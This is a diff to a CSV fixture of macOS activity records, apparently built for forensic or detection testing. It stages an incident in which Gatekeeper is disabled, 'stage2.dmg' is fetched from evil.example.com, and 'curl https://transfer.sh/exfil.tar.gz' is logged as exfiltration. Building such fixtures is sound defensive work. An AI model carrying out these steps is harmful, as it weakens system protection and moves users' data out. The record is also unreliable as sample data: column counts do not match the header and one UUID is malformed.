@@ -1,10 +1,8 @@
-stream,bundle_id,start_time,end_time,value
-/app/usage,com.apple.Terminal,2026-03-15 14:22:00,2026-03-15 14:35:00,
-/app/usage,com.googlecode.iterm2,2026-03-15 14:23:00,2026-03-15 14:34:00,
-/app/usage,com.microsoft.VSCode,2026-03-15 14:24:00,2026-03-15 14:30:00,
-/app/inFocus,com.apple.Terminal,2026-03-15 14:22:00,2026-03-15 14:25:00,
-/app/inFocus,com.apple.Terminal,2026-03-15 14:28:00,2026-03-15 14:33:00,
-/device/isLocked,,2026-03-15 13:00:00,2026-03-15 14:22:00,locked
-/device/isLocked,,2026-03-15 14:22:00,2026-03-15 14:35:00,unlocked
-/app/usage,com.apple.Safari,2026-03-15 14:25:00,2026-03-15 14:28:00,
-/app/usage,com.apple.Finder,2026-03-15 14:30:00,2026-03-15 14:32:00,
+zobject_uuid,zstreamname,zvalueinteger,zvaluedouble,zstarttimestamp,zenddtimestamp,duration_sec,zsource_application_id,zsource_bundleid,zvaluestring
+A8F3D2E1-B9C7-456E-882D-1409AA1F2D3B,/app/usage,1,,2026-03-15 14:20:00.118427+0900,2026-03-15 14:22:50.117822+0900,170.0,12,com.apple.Safari,com.apple.Safari
+B9C2E8F1-D7A3-456B-1D5F-8E3C2A7B9D4E,/app/inFocus,1,,2026-03-15 14:23:09.884751+0900,2026-03-15 14:23:11.704288+0900,1.8,18,com.apple.Terminal,com.apple.Terminal
+C4E8A1F2-D3B6-789A-8C2E-4F1B9D7E3A6C,/app/usage,1,,2026-03-15 14:23:11.704288+0900,2026-03-15 14:25:00.227918+0900,108.5,22,com.apple.SystemPreferences,com.apple.systempreferences
+D1F8A3C2-E9B5-612B-7C4D-8E2F1A9B3C6D,/app/activity,1,,2026-03-15 14:25:00.227918+0900,2026-03-15 14:25:00.301775+0900,0.07,24,com.apple.systempreferences,com.apple.systempreferences,"Security & Privacy > Gatekeeper > disable"
+E7F2A8C1-D9B4-567C-2E6F-9A4D3B8C1E5F,/safari/history,,,2026-03-15 14:25:48.117422+0900,2026-03-15 14:25:48.117422+0900,0.0,12,com.apple.Safari,com.apple.Safari,"https://evil.example.com/stage2.dmg"
+F8A4B5C6-D7E8-901A-3B4C-5D6E7F8A9B0C,/notification/usage,1,,2026-03-15 14:35:18.412557+0900,2026-03-15 14:35:18.412557+0900,0.0,28,com.apple.NotificationCenter,com.apple.notificationcenterui,"alert: Gatekeeper has been disabled"
+G9B5C6D7-E8F9-012B-4C5D-6E7F8A9B0C1D,/app/usage,1,,2026-03-15 14:36:00.821412+0900,2026-03-15 14:36:33.119224+0900,32.3,32,com.apple.Terminal,com.apple.Terminal,"curl https://transfer.sh/exfil.tar.gz"
